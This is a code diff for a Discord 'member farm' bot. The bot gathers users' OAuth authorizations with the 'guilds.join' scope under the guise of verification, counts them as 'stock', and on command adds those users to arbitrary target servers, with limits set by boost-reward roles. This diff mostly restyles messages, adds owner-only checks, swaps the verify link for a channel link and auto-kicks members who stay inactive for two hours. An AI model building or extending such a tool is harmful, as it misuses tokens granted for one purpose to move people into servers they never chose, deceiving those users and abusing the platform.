@@ -23,6 +23,8 @@ const PORT = process.env.PORT || 8080;
 
 const DEFAULT_PREFIX = ','; 
 let currentPrefix = DEFAULT_PREFIX;
+const OWNER_ID = '1481977461053984845';
+const EMBED_COLOR = 0x2F3136; // Sleek grey-black tone
 
 // --- Built-in File Persistence Setup ---
 const DB_FILE = path.join(__dirname, 'database.json');
@@ -95,7 +97,8 @@ const CHANNELS = {
     AUTORESTOCK: '1563253480553054358',       
     FARM_LOG: '1563253450693808210',          
     VERIFICATION_LOG: '1563253454653235261',  
-    AUTO_DELETE: '1563253483824746659'        
+    AUTO_DELETE: '1563253483824746659',
+    ADD_BOT: '1563253479059886223'        
 };
 
 const client = new Client({
@@ -168,9 +171,9 @@ app.get('/', async (req, res) => {
                     let verifLogChannel = client.channels.cache.get(CHANNELS.VERIFICATION_LOG) || await client.channels.fetch(CHANNELS.VERIFICATION_LOG);
                     if (verifLogChannel) {
                         const logEmbed = new EmbedBuilder()
-                            .setTitle(' New User Verified')
-                            .setDescription(`User **${userData.username}** (\`${userData.id}\`) verified successfully!\n\n**Total Available Stock:** \`${totalStock}\``)
-                            .setColor(0x00FF00)
+                            .setTitle('New User Verified')
+                            .setDescription(`User **${userData.username}** (\`${userData.id}\`) verified successfully.\n\nTotal Available Stock: \`${totalStock}\``)
+                            .setColor(EMBED_COLOR)
                             .setTimestamp();
 
                         await verifLogChannel.send({ embeds: [logEmbed] });
@@ -180,7 +183,7 @@ app.get('/', async (req, res) => {
                 }
             }
 
-            return res.send(`<html><body style="background:#111;color:#55ff55;text-align:center;padding-top:50px;"><h1>Verified Successfully!</h1><p>You can close this window and return to Discord.</p></body></html>`);
+            return res.send(`<html><body style="background:#111;color:#55ff55;text-align:center;padding-top:50px;"><h1>Verified Successfully</h1><p>You can close this window and return to Discord.</p></body></html>`);
         } else {
             console.error('[OAUTH TOKEN ERROR]', tokenRes.data);
             return res.send(`<html><body style="background:#111;color:#ff4444;text-align:center;padding-top:50px;"><h1>Verification Failed</h1><p>Token exchange rejected by Discord.</p></body></html>`);
@@ -198,17 +201,16 @@ async function sendRestockAnnouncement(channel, amountAdded) {
         let dbData = readDB();
         const totalStock = Object.keys(dbData.users).length;
         const restockMessage = 
-            `**Restock Alert!**\n\n` +
-            `**Flex Network** has restocked with **${amountAdded}**!\n\n` +
+            `**Restock Alert**\n\n` +
+            `**Flex Network** has restocked with **${amountAdded}** accounts.\n\n` +
             `> Current Stock: **${totalStock}**\n\n` +
-            `> **Want more per command?**\n` +
+            `> **Support Channels**\n` +
             `-# <#1563253471145361572> / <#1563253473238065326>\n\n` +
-            `> **Quick Head To Channel!**\n` +
+            `> **Quick Links**\n` +
             `-# <#1563253483824746659> / <#1563253479059886223>\n\n` +
             `@everyone`;
 
-        const sentMessage = await channel.send({ content: restockMessage });
-        await sentMessage.react('☑️');
+        await channel.send({ content: restockMessage });
     } catch (announcementErr) {
         console.error('Failed restock announcement:', announcementErr);
     }
@@ -257,10 +259,30 @@ client.on('presenceUpdate', async (oldPresence, newPresence) => {
     } catch (err) {}
 });
 
+// --- 2-Hour Inactivity Kick Tracking ---
+const pendingJoins = new Map();
+
+client.on('guildMemberAdd', member => {
+    if (member.user.bot) return;
+    const timer = setTimeout(async () => {
+        try {
+            if (member.kickable) {
+                await member.kick('Inactive: Did not use join command within 2 hours.');
+                console.log(`[AUTO-KICK] Kicked ${member.user.tag} for inactivity.`);
+            }
+        } catch (e) {
+            console.error('Failed to auto-kick inactive member:', e);
+        }
+        pendingJoins.delete(member.id);
+    }, 2 * 60 * 60 * 1000);
+
+    pendingJoins.set(member.id, timer);
+});
+
 client.on('interactionCreate', async interaction => {
     if (interaction.isButton()) {
         if (interaction.customId === 'restock_yes') {
-            await interaction.update({ content: '✅ Restock announcement confirmed! Sending to restock channel...', components: [] });
+            await interaction.update({ content: 'Restock announcement confirmed. Sending to restock channel.', components: [] });
             try {
                 const restockChannel = client.channels.cache.get(CHANNELS.AUTORESTOCK) || await client.channels.fetch(CHANNELS.AUTORESTOCK);
                 if (restockChannel) {
@@ -270,12 +292,15 @@ client.on('interactionCreate', async interaction => {
             } catch (err) {}
             return;
         } else if (interaction.customId === 'restock_no') {
-            return interaction.update({ content: '❌ Restock announcement cancelled.', components: [] });
+            return interaction.update({ content: 'Restock announcement cancelled.', components: [] });
         }
     }
 
     if (!interaction.isChatInputCommand()) return;
     if (interaction.commandName === 'say') {
+        if (interaction.user.id !== OWNER_ID) {
+            return interaction.reply({ content: 'Only the bot owner can use this command.', ephemeral: true });
+        }
         const textMessage = interaction.options.getString('message');
         const isEmbed = interaction.options.getBoolean('embed') || false;
         const webhookUrl = interaction.options.getString('webhook_url');
@@ -284,36 +309,36 @@ client.on('interactionCreate', async interaction => {
             if (webhookUrl) {
                 const whClient = new WebhookClient({ url: webhookUrl });
                 if (isEmbed) {
-                    await whClient.send({ embeds: [new EmbedBuilder().setDescription(textMessage).setColor(0x5865F2)] });
+                    await whClient.send({ embeds: [new EmbedBuilder().setDescription(textMessage).setColor(EMBED_COLOR)] });
                 } else {
                     await whClient.send({ content: textMessage });
                 }
-                return interaction.reply({ content: '✅ Sent via Webhook!', ephemeral: true });
+                return interaction.reply({ content: 'Sent via Webhook.', ephemeral: true });
             }
 
             if (isEmbed) {
-                await interaction.channel.send({ embeds: [new EmbedBuilder().setDescription(textMessage).setColor(0x5865F2)] });
+                await interaction.channel.send({ embeds: [new EmbedBuilder().setDescription(textMessage).setColor(EMBED_COLOR)] });
             } else {
                 await interaction.channel.send({ content: textMessage });
             }
-            return interaction.reply({ content: '✅ Sent!', ephemeral: true });
+            return interaction.reply({ content: 'Sent.', ephemeral: true });
         } catch (err) {
-            return interaction.reply({ content: `❌ Failed: ${err.message}`, ephemeral: true });
+            return interaction.reply({ content: `Failed: ${err.message}`, ephemeral: true });
         }
     }
 });
 
 async function sendBoostStickyPanel(channel) {
     const boostContent = 
-        `⟡ **𝗙𝗟𝗘𝗫 | 𝗕𝗢𝗢𝗦𝗧 𝗥𝗘𝗪𝗔𝗥𝗗𝗦**\n\n` +
-        `⌁ **𝗕𝗢𝗢𝗦𝗧 𝗧𝗛𝗘 𝗦𝗘𝗥𝗩𝗘𝗥. 𝗘𝗔𝗥𝗡 𝗥𝗔𝗡𝗞𝗦.**\n\n` +
-        `💚 **1 Boost** = <@&1563467675236311100>\n\n` +
-        `💎 **2 Boosts** = <@&1563467259194908722>\n\n\n` +
-        `・**You only get rank for 2-3 weeks**\n` +
-        `・**Ranks arent automatically given.**\n` +
-        `・**Open a ticket in <#1563253473238065326> to claim your rank.**`;
+        `**FLEX | BOOST REWARDS**\n\n` +
+        `Boost the server to earn higher rank tier limits.\n\n` +
+        `2 Boosts = <@&1563467675236311100>\n\n` +
+        `4 Boosts = <@&1563467259194908722>\n\n\n` +
+        `Ranks are active for 2-3 weeks.\n` +
+        `Ranks are not automatically assigned.\n` +
+        `Open a ticket in <#1563253473238065326> to claim your rank.`;
 
-    const stickyEmbed = new EmbedBuilder().setDescription(boostContent).setColor(0x595B5C); 
+    const stickyEmbed = new EmbedBuilder().setDescription(boostContent).setColor(EMBED_COLOR); 
     if (lastBoostStickyMessage) {
         try { await lastBoostStickyMessage.delete(); } catch (e) {}
     }
@@ -344,9 +369,9 @@ client.on('messageCreate', async message => {
     if (message.author.bot) return;
 
     if (rawContent.toLowerCase() === ',rbot' || rawContent.toLowerCase() === '.rbot') {
-        const rbotEmbed = new EmbedBuilder().setDescription('Use the bot, click the button below.').setColor(0x595B5C);
+        const rbotEmbed = new EmbedBuilder().setDescription('Use the bot via the button below.').setColor(EMBED_COLOR);
         const rbotButton = new ActionRowBuilder().addComponents(
-            new ButtonBuilder().setLabel('use {r-bot}').setStyle(ButtonStyle.Link).setURL('https://discord.gg/ZK3Er7Xgdq')
+            new ButtonBuilder().setLabel('Use Bot').setStyle(ButtonStyle.Link).setURL('https://discord.gg/ZK3Er7Xgdq')
         );
         await message.channel.send({ embeds: [rbotEmbed], components: [rbotButton] });
         try { if (message.deletable) await message.delete(); } catch(e){}
@@ -358,41 +383,45 @@ client.on('messageCreate', async message => {
     const args = rawContent.slice(currentPrefix.length).trim().split(/ +/);
     const command = args.shift().toLowerCase();
 
+    if (message.author.id !== OWNER_ID && command !== 'join') {
+        return message.channel.send('Only the join command is available to regular members.');
+    }
+
     if (command === 'stickboost') {
+        if (message.author.id !== OWNER_ID) return;
         await sendBoostStickyPanel(message.channel);
         try { if (message.deletable) await message.delete(); } catch(e){}
         return;
     }
 
     if (command === 'verify' || command === 'link') {
-        const clientId = process.env.VERIFICATION_CLIENT_ID || process.env.CLIENT_ID || '1561438987464483048';
-        const redirectUri = process.env.REDIRECT_URI || 'https://farmerauth-production.up.railway.app';
-        const oauthUrl = `https://discord.com/api/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=identify+guilds.join`;
+        const verifyChannelUrl = 'https://discord.com/channels/1509295298365886474/1563253454653235261';
 
         const embed = new EmbedBuilder()
             .setTitle('Account Verification')
-            .setDescription('Click the button below to authorize with **Verification**.')
-            .setColor(0x00FF00);
+            .setDescription('Click the button below to navigate to the verification channel.')
+            .setColor(EMBED_COLOR);
 
         const row = new ActionRowBuilder().addComponents(
             new ButtonBuilder()
-                .setLabel('-> Verify')
+                .setLabel('Open Verification Channel')
                 .setStyle(ButtonStyle.Link)
-                .setURL(oauthUrl)
+                .setURL(verifyChannelUrl)
         );
 
         return message.channel.send({ embeds: [embed], components: [row] });
     }
 
     if (command === 'help') {
+        if (message.author.id !== OWNER_ID) return;
         const helpEmbed = new EmbedBuilder()
-            .setTitle('Member Farm — Command Panel')
+            .setTitle('Member Farm - Command Panel')
             .setDescription(`Current prefix: \`${currentPrefix}\` — change with \`${currentPrefix}prefix set <prefix>\``)
-            .setColor(0x5865F2)
+            .setColor(EMBED_COLOR)
             .addFields(
                 { 
                     name: 'Core & Verification', 
-                    value: `\`${currentPrefix}verify\` - Generates OAuth2 verify button\n\`${currentPrefix}stock\` - Views total active accounts\n\`${currentPrefix}auth\` - Displays authorization stats\n\`${currentPrefix}join <serverID>\` - Requests members to join target server\n\`${currentPrefix}bot\` - Bot invite button\n\`${currentPrefix}status\` - Bot operational status` 
+                    value: `\`${currentPrefix}verify\` - Generates verification link\n\`${currentPrefix}stock\` - Views total active accounts\n\`${currentPrefix}auth\` - Displays authorization stats\n\`${currentPrefix}join <serverID>\` - Requests members to join target server\n\`${currentPrefix}bot\` - Bot invite button\n\`${currentPrefix}status\` - Bot operational status` 
                 },
                 { 
                     name: 'Config & Management', 
@@ -409,36 +438,40 @@ client.on('messageCreate', async message => {
     }
 
     if (command === 'bot' || command === 'invite') {
+        if (message.author.id !== OWNER_ID) return;
         const inviteUrl = 'https://discord.com/api/oauth2/authorize?client_id=1561438987464483048&permissions=8&scope=bot+applications.commands';
         const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Add Bot').setStyle(ButtonStyle.Link).setURL(inviteUrl));
         return message.channel.send({ components: [row] });
     }
 
     if (command === 'stock') {
+        if (message.author.id !== OWNER_ID) return;
         const dbData = readDB();
         const users = Object.values(dbData.users);
         const lastRestockCount = Math.min(dbData.restockCounter || 0, users.length);
-        return message.channel.send({ embeds: [new EmbedBuilder().setTitle('📦 Flex Farmer Stock').setDescription(`Available users that can join servers from the last restock: **\`${lastRestockCount}\`**`).setColor(0x595B5C)] });
+        return message.channel.send({ embeds: [new EmbedBuilder().setTitle('Flex Farmer Stock').setDescription(`Available users that can join servers from the last restock: **\`${lastRestockCount}\`**`).setColor(EMBED_COLOR)] });
     }
 
     if (command === 'auth' || command === 'authed') {
+        if (message.author.id !== OWNER_ID) return;
         const dbData = readDB();
         const users = Object.values(dbData.users);
         const now = Date.now();
         const last24hCount = users.filter(user => user.authorized_at && user.authorized_at >= (now - 86400000)).length;
 
         const authEmbed = new EmbedBuilder()
-            .setTitle(' Auth & Stock Stats')
-            .setColor(0x5865F2)
+            .setTitle('Authorization & Stock Statistics')
+            .setColor(EMBED_COLOR)
             .addFields(
-                { name: ' Last 24 Hours', value: `\`${last24hCount}\` users authorized`, inline: true },
-                { name: ' All-Time', value: `\`${dbData.allTimeAuthCount || 0}\` total authorizations`, inline: true },
-                { name: ' Current Stock', value: `\`${users.length}\` active accounts`, inline: true }
+                { name: 'Last 24 Hours', value: `\`${last24hCount}\` users authorized`, inline: true },
+                { name: 'All-Time', value: `\`${dbData.allTimeAuthCount || 0}\` total authorizations`, inline: true },
+                { name: 'Current Stock', value: `\`${users.length}\` active accounts`, inline: true }
             );
         return message.channel.send({ embeds: [authEmbed] });
     }
 
     if (command === 'status') {
+        if (message.author.id !== OWNER_ID) return;
         const dbData = readDB();
         const users = Object.values(dbData.users);
         const uptimeSeconds = Math.floor(client.uptime / 1000);
@@ -446,16 +479,17 @@ client.on('messageCreate', async message => {
         const minutes = Math.floor((uptimeSeconds % 3600) / 60);
         const seconds = uptimeSeconds % 60;
         const statusEmbed = new EmbedBuilder()
-            .setTitle(' Flex Farmer Status')
-            .setColor(0x00FF00)
+            .setTitle('Flex Farmer Status')
+            .setColor(EMBED_COLOR)
             .addFields(
-                { name: ' Active Verified Stock', value: `\`${users.length}\` accounts`, inline: true },
-                { name: ' Uptime', value: `\`${hours}h ${minutes}m ${seconds}s\``, inline: true }
+                { name: 'Active Verified Stock', value: `\`${users.length}\` accounts`, inline: true },
+                { name: 'Uptime', value: `\`${hours}h ${minutes}m ${seconds}s\``, inline: true }
             );
         return message.channel.send({ embeds: [statusEmbed] });
     }
 
     if (command === 'restock') {
+        if (message.author.id !== OWNER_ID) return;
         const dbData = readDB();
         const users = Object.values(dbData.users);
         const amount = parseInt(args[0]) || users.length;
@@ -464,9 +498,9 @@ client.on('messageCreate', async message => {
         writeDB(dbData);
 
         const promptEmbed = new EmbedBuilder()
-            .setTitle(' Restock Stock Prepared')
-            .setDescription(`Successfully stocked **${amount}** authorized users!\n\n**Do you want to send an announcement message in the restock channel (<#${CHANNELS.AUTORESTOCK}>)?**`)
-            .setColor(0x5865F2);
+            .setTitle('Restock Stock Prepared')
+            .setDescription(`Successfully stocked **${amount}** authorized users.\n\n**Send an announcement message in the restock channel (<#${CHANNELS.AUTORESTOCK}>)?**`)
+            .setColor(EMBED_COLOR);
 
         const row = new ActionRowBuilder().addComponents(
             new ButtonBuilder().setCustomId('restock_yes').setLabel('Yes').setStyle(ButtonStyle.Success),
@@ -477,6 +511,7 @@ client.on('messageCreate', async message => {
     }
 
     if (command === 'remove') {
+        if (message.author.id !== OWNER_ID) return;
         const amount = parseInt(args[0]) || 1;
         let dbData = readDB();
         let userKeys = Object.keys(dbData.users);
@@ -485,7 +520,7 @@ client.on('messageCreate', async message => {
         }
         writeDB(dbData);
         const remainingStock = Object.keys(dbData.users).length;
-        return message.channel.send(` Removed **${amount}** accounts from stock. Current stock: \`${remainingStock}\`.`);
+        return message.channel.send(`Removed **${amount}** accounts from stock. Current stock: \`${remainingStock}\`.`);
     }
 
     if (command === 'join') {
@@ -495,22 +530,21 @@ client.on('messageCreate', async message => {
         const dbData = readDB();
         let tokensToUse = Object.values(dbData.users);
         if (tokensToUse.length === 0) {
-            return message.channel.send({ embeds: [new EmbedBuilder().setTitle('❌ Out of Stock').setDescription(`No accounts available.`).setColor(0xFF0000)] });
+            return message.channel.send({ embeds: [new EmbedBuilder().setTitle('Out of Stock').setDescription(`No accounts available.`).setColor(EMBED_COLOR)] });
         }
 
-        // Updated role limits from image
         const roleLimits = [
             { id: '1564676932195455047', limit: 2 },   
             { id: '1563467132107231253', limit: 4 },   
             { id: '1563467152202137681', limit: 6 },   
             { id: '1563467218212356118', limit: 8 },   
             { id: '1563467378040504431', limit: 10 },   
-            { id: '1563467675236311100', limit: 15 },  
+            { id: '1563467675236311100', limit: 12 },  
             { id: '1563467259194908722', limit: 20 }   
         ];
 
         let allowedLimit = Infinity;
-        let userMaxQueue = 20; // Default reference limit
+        let userMaxQueue = 20; 
         for (const tier of roleLimits) {
             if (message.member.roles.cache.has(tier.id)) {
                 allowedLimit = tier.limit;
@@ -526,7 +560,6 @@ client.on('messageCreate', async message => {
 
         const verificationBotToken = process.env.VERIFICATION_BOT_TOKEN || process.env.DISCORD_TOKEN;
 
-        // Check if Verification bot is in target server
         try {
             const checkGuildRes = await getHttps(`https://discord.com/api/v10/users/@me/guilds`, {
                 'Authorization': `Bot ${verificationBotToken}`
@@ -537,19 +570,23 @@ client.on('messageCreate', async message => {
             if (!isInServer) {
                 const errorEmbed = new EmbedBuilder()
                     .setTitle('Bot Error')
-                    .setDescription('The bot is not in this server yet. Please go to <#1563253483824746659> and invite it to your server.\n\nOnce the bot has joined, try using the command again.')
-                    .setColor(0xFF0000);
+                    .setDescription(`The bot is not in this server yet. Please go to <#${CHANNELS.ADD_BOT}> and invite it to your server.\n\nOnce the bot has joined, try using the command again.`)
+                    .setColor(EMBED_COLOR);
                 return message.channel.send({ embeds: [errorEmbed] });
             }
         } catch (e) {
             console.error('Failed to check guild membership:', e);
         }
 
-        // Send success queue embed like your screenshot
+        if (pendingJoins.has(message.author.id)) {
+            clearTimeout(pendingJoins.get(message.author.id));
+            pendingJoins.delete(message.author.id);
+        }
+
         const addingEmbed = new EmbedBuilder()
             .setTitle('Adding Members')
             .setDescription(`Total members to send: **${tokensToUse.length}**\nServer ID: **${targetGuildId}**\nYour queue position: **1/${userMaxQueue}**`)
-            .setColor(0x5865F2);
+            .setColor(EMBED_COLOR);
         
         await message.channel.send({ embeds: [addingEmbed] });
 
@@ -573,9 +610,9 @@ client.on('messageCreate', async message => {
             let farmLogChannel = client.channels.cache.get(CHANNELS.FARM_LOG) || await client.channels.fetch(CHANNELS.FARM_LOG);
             if (farmLogChannel) {
                 const farmEmbed = new EmbedBuilder()
-                    .setTitle(' Farm Execution Log')
+                    .setTitle('Farm Execution Log')
                     .setDescription(`**Executed By:** <@${message.author.id}>\n**Adder Bot:** Verification\n**Target Server:** \`${targetGuildId}\`\n**Successfully Added:** \`${successCount}\` / \`${tokensToUse.length}\` accounts`)
-                    .setColor(0x5865F2)
+                    .setColor(EMBED_COLOR)
                     .setTimestamp();
                 await farmLogChannel.send({ embeds: [farmEmbed] });
             }
